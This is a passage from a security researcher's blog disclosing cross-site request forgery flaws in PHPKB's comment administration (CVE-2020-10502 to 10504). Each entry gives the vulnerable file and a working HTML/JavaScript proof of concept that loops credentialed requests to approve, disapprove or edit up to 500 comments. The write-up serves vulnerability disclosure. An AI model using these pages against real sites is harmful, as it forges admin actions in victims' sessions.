			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">name=depname&amp;show=yes&amp;submit_department=Save+Department&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=edit</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-approving-a-new-comment-cve-2020-10502">Cross-Site Request Forgery when approving a new comment (CVE-2020-10502)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-comments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “comments” and click on “pending”;</li>
  <li>select the comment, then click on “approve”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">comments</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">approved</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-comments.php?cid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=approve</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-disapproving-a-new-comment-cve-2020-10503">Cross-Site Request Forgery when disapproving a new comment (CVE-2020-10503)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-comments.php</p>

<p>Steps required in order to find the vulnerability:</p>

<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “comments” and click on “approved”;</li>
  <li>select the comment, then click on “disapprove”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">comments</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">disapproved</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-comments.php?cid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=disapprove</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-comment-cve-2020-10504">Cross-Site Request Forgery when editing a comment (CVE-2020-10504)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-comments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “comments” and click on “pending”;</li>
  <li>select the comment, click on “edit”, then on “save comment”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change name parameter to set the username of the person posting a comment --&gt;</span>
<span class="c">&lt;!-- Change the email parameter to change the user's email that is posting a comment--&gt;</span>
<span class="c">&lt;!-- Change the comment parameter to change user's comment --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">categories</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-comment.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">name=test&amp;email=test@test.com&amp;comment=test&amp;status=approved&amp;type=&amp;cid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;submit=Save+Changes</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<p>That’s all folks, see you next time!</p>

</div>



<div class="pagination">
  
    <a href="/telecomitalia" class="left arrow">&#8592;</a>
  
  
    <a href="/phpkb2" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>
    </main>

    <footer>
  <span>
    2019 - <time datetime="2021-06-18 19:25:00 +0000">2021 </time>Antonio Cannito &copy;
  </span>
</footer>

  </body>
</html>
